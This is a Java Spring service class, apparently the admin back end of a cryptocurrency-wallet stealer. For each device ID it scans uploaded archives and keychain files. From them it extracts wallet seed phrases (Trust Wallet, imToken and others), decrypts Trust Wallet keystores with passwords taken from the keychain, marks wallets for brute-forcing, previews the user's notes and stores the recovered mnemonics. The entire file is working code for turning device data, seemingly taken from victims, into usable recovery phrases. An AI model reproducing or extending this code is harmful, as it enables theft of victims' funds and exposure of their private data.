package com.admin.service;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Service;

import com.admin.config.V26AdminProperties;
import com.admin.dao.MnemonicDao;
import com.admin.dao.UploadFileDao;
import com.admin.entity.DeviceEntity;
import com.admin.entity.MnemonicEntity;
import com.admin.entity.UploadFileEntity;
import com.admin.parse.ArchiveIO;
import com.admin.parse.ArchiveScanner;
import com.admin.parse.ImTokenWallet;
import com.admin.parse.KeychainParse;
import com.admin.parse.ParsedNote;
import com.admin.parse.TrustWallet;
import com.admin.parse.WalletDisplay;
import com.admin.parse.WalletInspect;
import com.admin.parse.WalletMatcher;
import com.admin.util.MnemonicAesUtil;
import com.admin.util.UploadPaths;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class DeviceWalletService {

    private final UploadFileDao uploadFileDao;
    private final MnemonicDao mnemonicDao;
    private final ArchiveScanner archiveScanner;
    private final V26AdminProperties props;
    private final MnemonicPersistService persistService;
    private final KeychainParse keychainParse;
    private final TrustWallet trustWallet;
    private final ImTokenWallet imTokenWallet;

    public Map<String, Object> enrichDetail(DeviceEntity d, Map<String, Object> data) {
        List<WalletDisplay> displays = scan(d);
        List<Map<String, Object>> wallets = new ArrayList<>();
        List<Map<String, Object>> notes = new ArrayList<>();
        List<String[]> persistItems = new ArrayList<>();
        for (WalletDisplay w : displays) {
            if ("notes".equals(w.getWalletKey())) {
                notes.add(noteBlock(w));
            } else {
                wallets.add(walletCard(w, d.getDeviceId()));
            }
            if (w.getPhrase() != null && !w.getPhrase().isBlank() && w.isStatusOk()
                    && !"notes".equals(w.getWalletKey())) {
                persistItems.add(new String[] {w.getName(), w.getPhrase()});
            }
        }
        if (!persistItems.isEmpty()) {
            try {
                persistService.finalizeRecovered(d.getDeviceId(), d.getAppId(), persistItems, false);
            } catch (Exception e) {
                log.warn("persist parse phrases fail device={}: {}", d.getDeviceId(), e.toString());
            }
        }
        data.put("wallets", wallets);
        data.put("notesItems", notes);
        data.put("walletCount", wallets.size());
        data.put("notesArchiveCount", notes.size());
        data.put("hasKeychain", hasKeychain(d.getDeviceId()));
        return data;
    }

    public boolean hasKeychain(String deviceId) {
        return UploadPaths.findDeviceKeychain(props.getUploadDir(), deviceId) != null;
    }

    public List<WalletDisplay> scan(DeviceEntity d) {
        String did = d.getDeviceId();
        List<WalletDisplay> out = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        List<UploadFileEntity> files = uploadFileDao.selectList(
                new QueryWrapper<UploadFileEntity>().eq("deviceId", did).orderByDesc("id"));
        for (UploadFileEntity u : files) {
            String fname = StringUtils.trimToEmpty(u.getFileName());
            if (fname.isEmpty() || seen.contains(fname)) {
                continue;
            }
            if (u.getFileSize() != null && u.getFileSize() <= 0) {
                continue;
            }
            boolean core = WalletMatcher.isCoreExportName(fname);
            boolean archive = WalletMatcher.isArchive(fname);
            if (!core && !archive) {
                continue;
            }
            Path path = resolve(u);
            if (core) {
                if (path == null) {
                    log.warn("scan skip core_export missing device={} file={} diskPath={}",
                            did, fname, u.getDiskPath());
                    continue;
                }
                out.addAll(scanPath(did, fname, path));
                seen.add(fname);
                continue;
            }
            // 对齐 Python V2 classify：generic 归档不进解析卡
            String[] matched = WalletMatcher.matchWallet(fname);
            if (matched == null) {
                continue;
            }
            seen.add(fname);
            if (path == null) {
                log.warn("scan file missing device={} file={} diskPath={}", did, fname, u.getDiskPath());
                out.add(archiveScanner.missingFile(matched[0], fname, matched[1]));
            } else {
                out.addAll(scanPath(did, fname, path));
            }
        }
        if (out.isEmpty()) {
            for (Path p : UploadPaths.listDeviceArchives(props.getUploadDir(), did)) {
                String fname = p.getFileName().toString();
                if (seen.contains(fname)) {
                    continue;
                }
                if (!WalletMatcher.isCoreExportName(fname) && WalletMatcher.matchWallet(fname) == null) {
                    continue;
                }
                seen.add(fname);
                out.addAll(scanPath(did, fname, p));
            }
        }
        mergeKeychain(did, out);
        return expandImToken(out);
    }

    public Path resolveUpload(String deviceId, String fileName) {
        if (fileName == null || fileName.isBlank()) {
            return null;
        }
        UploadFileEntity file = uploadFileDao.selectOne(new QueryWrapper<UploadFileEntity>()
                .eq("deviceId", deviceId)
                .eq("fileName", fileName.trim())
                .orderByDesc("id")
                .last("LIMIT 1"));
        if (file != null) {
            Path p = resolve(file);
            if (p != null) {
                return p;
            }
        }
        return resolveOnDisk(deviceId, fileName);
    }

    public byte[] readNotesMember(String deviceId, String fileName, String member) {
        Path path = resolveUpload(deviceId, fileName);
        if (path == null || member == null || member.isBlank()) {
            return null;
        }
        byte[][] found = new byte[1][];
        ArchiveIO.walk(path, null, (name, in, size) -> {
            if (found[0] != null) {
                ArchiveIO.skipFully(in, size);
                return;
            }
            if (member.equals(name) || name.endsWith("/" + member) || name.replace('\\', '/').endsWith(member)) {
                found[0] = ArchiveIO.readLimited(in, 8_000_000);
            } else {
                ArchiveIO.skipFully(in, size);
            }
        }, 8_000_000);
        return found[0];
    }

    private List<WalletDisplay> scanPath(String deviceId, String fileName, Path path) {
        try {
            if (WalletMatcher.isCoreExportName(fileName)) {
                return archiveScanner.scanCoreExport(deviceId, fileName, path);
            }
            return archiveScanner.scanFile(deviceId, fileName, path);
        } catch (Exception e) {
            log.warn("scan fail file={} err={}", fileName, e.toString());
            return List.of();
        }
    }

    private Path resolve(UploadFileEntity u) {
        Path fromDb = UploadPaths.resolveDiskPath(props.getUploadDir(), u.getDiskPath());
        if (fromDb != null) {
            return fromDb;
        }
        if (u.getDiskPath() != null && !u.getDiskPath().isBlank()) {
            Path abs = Paths.get(u.getDiskPath());
            if (Files.isRegularFile(abs)) {
                return abs;
            }
        }
        return resolveOnDisk(u.getDeviceId(), u.getFileName());
    }

    private Path resolveOnDisk(String deviceId, String fileName) {
        return UploadPaths.findDeviceFile(props.getUploadDir(), deviceId, fileName);
    }

    private List<WalletDisplay> expandImToken(List<WalletDisplay> items) {
        List<WalletDisplay> out = new ArrayList<>();
        for (WalletDisplay w : items) {
            if ("imtoken".equals(w.getWalletKey())) {
                out.addAll(imTokenWallet.expand(w));
            } else {
                out.add(w);
            }
        }
        return out;
    }

    private void mergeKeychain(String did, List<WalletDisplay> items) {
        Path kc = UploadPaths.findDeviceKeychain(props.getUploadDir(), did);
        Map<String, KeychainParse.WalletHit> hits = kc == null
                ? new LinkedHashMap<>()
                : keychainParse.extract(kc);
        if (hits == null) {
            hits = new LinkedHashMap<>();
        }
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey())) {
                recoverTrust(w, hits.get("trust"));
            }
        }
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey()) && StringUtils.isNotBlank(w.getPhrase())) {
                continue;
            }
            applyKeychainPhrases(w, hits.get(w.getWalletKey()));
        }
        Set<String> seenKeys = new LinkedHashSet<>();
        for (WalletDisplay w : items) {
            if (StringUtils.isNotBlank(w.getWalletKey())) {
                seenKeys.add(w.getWalletKey());
            }
        }
        for (Map.Entry<String, KeychainParse.WalletHit> e : hits.entrySet()) {
            if (seenKeys.contains(e.getKey()) || e.getValue().getPhrases() == null
                    || e.getValue().getPhrases().isEmpty()) {
                continue;
            }
            List<String> phrases = e.getValue().getPhrases();
            WalletDisplay d = new WalletDisplay();
            d.setName(WalletMatcher.walletTitle(e.getKey()));
            d.setSourceFile("keychain.xml");
            d.setWalletKey(e.getKey());
            d.setPhrase(String.join("\n", phrases));
            d.setStatusOk(true);
            d.setUnlockable(false);
            d.setBrute(false);
            d.setStatusLabel("已解析");
            String src = StringUtils.defaultIfBlank(e.getValue().getSource(), "Keychain");
            d.setMessage(phrases.size() == 1 ? src + "：" + phrases.get(0)
                    : src + "，共 " + phrases.size() + " 组助记词");
            items.add(d);
        }
        recoverTrustFromDiskIfMissing(did, items, hits);
    }

    private void recoverTrust(WalletDisplay w, KeychainParse.WalletHit hit) {
        Map<String, String> utc = hit == null ? null : hit.getUtcPasswords();
        if (utc == null || utc.isEmpty() || w == null || w.getArchivePath() == null) {
            return;
        }
        List<String> recovered = trustWallet.recover(w.getArchivePath(), w.getArchiveRoots(), utc);
        if (recovered != null && !recovered.isEmpty()) {
            w.setPhrase(String.join("\n", recovered));
            w.setStatusOk(true);
            w.setUnlockable(false);
            w.setBrute(false);
            w.setStatusLabel("已解析");
            String src = "Keychain UTC + Documents keystore";
            w.setMessage(recovered.size() == 1 ? src + "：" + recovered.get(0)
                    : src + "，共 " + recovered.size() + " 组助记词");
        }
    }

    private void recoverTrustFromDiskIfMissing(String did, List<WalletDisplay> items,
            Map<String, KeychainParse.WalletHit> hits) {
        KeychainParse.WalletHit hit = hits.get("trust");
        if (hit == null || hit.getUtcPasswords() == null || hit.getUtcPasswords().isEmpty()) {
            return;
        }
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey()) && StringUtils.isNotBlank(w.getPhrase())) {
                return;
            }
        }
        Path tar = null;
        for (Path p : UploadPaths.listDeviceArchives(props.getUploadDir(), did)) {
            if ("trust".equals(WalletMatcher.classifyV2(p.getFileName().toString()))) {
                tar = p;
                break;
            }
        }
        if (tar == null) {
            return;
        }
        WalletDisplay w = null;
        for (WalletDisplay item : items) {
            if ("trust".equals(item.getWalletKey())) {
                w = item;
                break;
            }
        }
        if (w == null) {
            w = new WalletDisplay();
            w.setName(WalletMatcher.walletTitle("trust"));
            w.setSourceFile(tar.getFileName().toString());
            w.setWalletKey("trust");
            items.add(w);
        }
        w.setArchivePath(tar);
        recoverTrust(w, hit);
    }

    private void applyKeychainPhrases(WalletDisplay w, KeychainParse.WalletHit hit) {
        if (hit == null || hit.getPhrases() == null || hit.getPhrases().isEmpty()) {
            return;
        }
        List<String> phrases = hit.getPhrases();
        w.setPhrase(String.join("\n", phrases));
        w.setStatusOk(true);
        w.setUnlockable(false);
        w.setBrute(false);
        w.setStatusLabel("已解析");
        String src = StringUtils.defaultIfBlank(hit.getSource(), "Keychain");
        w.setMessage(phrases.size() == 1 ? src + "：" + phrases.get(0)
                : src + "，共 " + phrases.size() + " 组助记词");
    }

    private Map<String, Object> walletCard(WalletDisplay w, String deviceId) {
        String stored = storedPhrase(deviceId, w.getName(), w.getPhrase());
        boolean ok = w.isStatusOk() || StringUtils.isNotBlank(stored);
        boolean unlockable = w.isUnlockable() || WalletInspect.maybePasswordLocked(w.getWalletKey());
        boolean brute = w.isBrute() || ("tonhub".equals(w.getWalletKey()) && unlockable);
        String statusLabel = StringUtils.defaultIfBlank(w.getStatusLabel(),
                ok ? "已解析" : (unlockable ? "待解锁" : "未解析"));
        if (ok) {
            statusLabel = "已解析";
            unlockable = false;
            brute = false;
        }
        String message = StringUtils.defaultString(w.getMessage());
        String phrase = StringUtils.defaultIfBlank(stored, w.getPhrase());
        if (StringUtils.isNotBlank(phrase) && message.contains(phrase)) {
            message = "已直接解析助记词";
        }
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("name", w.getName());
        m.put("source_file", w.getSourceFile());
        m.put("wallet_key", w.getWalletKey());
        m.put("message", message);
        m.put("status_ok", ok);
        m.put("status_label", statusLabel);
        m.put("unlockable", unlockable && !ok);
        m.put("brute", brute && !ok);
        m.put("phrase_masked", mask(phrase));
        m.put("account_name", w.getAccountName());
        m.put("password_hint", w.getPasswordHint());
        m.put("wallet_instance_id", w.getWalletInstanceId());
        return m;
    }

    private Map<String, Object> noteBlock(WalletDisplay w) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("name", w.getName());
        m.put("source_file", w.getSourceFile());
        m.put("wallet_key", "notes");
        m.put("message", w.getMessage());
        m.put("status_ok", w.isStatusOk());
        m.put("status_label", w.isStatusOk() ? "已解析" : StringUtils.defaultIfBlank(w.getStatusLabel(), "未解析"));
        List<Map<String, Object>> notes = new ArrayList<>();
        int i = 0;
        if (w.getNotes() != null) {
            for (ParsedNote n : w.getNotes()) {
                Map<String, Object> item = new LinkedHashMap<>();
                item.put("note_index", i++);
                item.put("title", n.getTitle());
                item.put("folder", n.getFolder());
                item.put("account", n.getAccount());
                item.put("modified_label", n.getModifiedLabel());
                String body = n.getBody() == null ? "" : n.getBody();
                item.put("body_preview", body.length() > 120 ? body.substring(0, 120) + "…" : body);
                item.put("locked", n.isLocked());
                int photoCount = n.getPhotos() == null ? 0 : n.getPhotos().size();
                item.put("photo_count", photoCount);
                notes.add(item);
            }
        }
        m.put("notes", notes);
        return m;
    }

    private String storedPhrase(String deviceId, String source, String scanned) {
        if (scanned != null && !scanned.isBlank()) {
            return scanned;
        }
        return loadStoredPhrase(deviceId, null, source);
    }

    /**
     * 从 mnemonic 表按 wallet_key / 钱包显示名匹配已入库助记词（对齐 Python reveal 兜底）。
     */
    public String loadStoredPhrase(String deviceId, String walletKey, String title) {
        List<MnemonicEntity> rows = mnemonicDao.selectList(new QueryWrapper<MnemonicEntity>().eq("deviceId", deviceId));
        if (rows.isEmpty()) {
            return null;
        }
        String aes = props.getMnemonicAesKey();
        String keyLow = walletKey == null ? "" : walletKey.trim().toLowerCase(Locale.ROOT);
        String titleLow = title == null ? "" : title.trim().toLowerCase(Locale.ROOT);
        List<String> matched = new ArrayList<>();
        List<String> all = new ArrayList<>();
        for (MnemonicEntity row : rows) {
            String plain;
            try {
                plain = MnemonicAesUtil.decrypt(row.getResult(), aes);
            } catch (Exception e) {
                continue;
            }
            if (plain == null || plain.isBlank() || MnemonicAesUtil.looksEncrypted(plain)) {
                continue;
            }
            plain = plain.trim();
            all.add(plain);
            String src = row.getSource() == null ? "" : row.getSource().trim().toLowerCase(Locale.ROOT);
            if ((!keyLow.isEmpty() && (src.contains(keyLow) || src.equals(keyLow)))
                    || (!titleLow.isEmpty() && (src.contains(titleLow) || src.equals(titleLow)))) {
                matched.add(plain);
            }
        }
        List<String> pool = !matched.isEmpty() ? matched : (all.size() == 1 ? all : List.of());
        if (pool.isEmpty()) {
            return null;
        }
        return String.join("\n", pool);
    }

    private static String mask(String phrase) {
        if (phrase == null || phrase.isBlank()) {
            return "";
        }
        String[] parts = phrase.trim().split("\\s+");
        if (parts.length < 3) {
            return "****";
        }
        return parts[0] + " **** " + parts[parts.length - 1];
    }

    public static String sha256Hex(String text) {
        try {
            byte[] d = MessageDigest.getInstance("SHA-256").digest(text.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (byte b : d) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
}
